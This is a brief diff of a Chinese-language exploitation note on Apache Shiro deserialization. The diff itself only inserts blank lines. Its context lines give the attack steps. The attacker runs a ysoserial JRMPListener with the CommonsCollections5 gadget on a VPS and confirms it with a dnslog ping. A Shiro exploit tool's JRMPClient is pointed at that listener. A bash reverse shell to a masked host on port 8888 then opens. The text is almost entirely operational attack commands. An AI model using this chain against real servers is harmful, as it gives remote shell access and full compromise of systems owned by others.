@@ -29,6 +29,8 @@
 ## 0x00 漏洞利用
   
   1.使用ysoserial.jar 工具搭建服务，VPS执行 java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "ping rskzeg.dnslog.cn"
+  
   2.shiro反序列利用工具中选择JRMPClient,然后输入VPS上搭建服务的地址
+  
   3.执行反弹命令bash -i >& /dev/tcp/xxxxxx/8888 0>&1
   
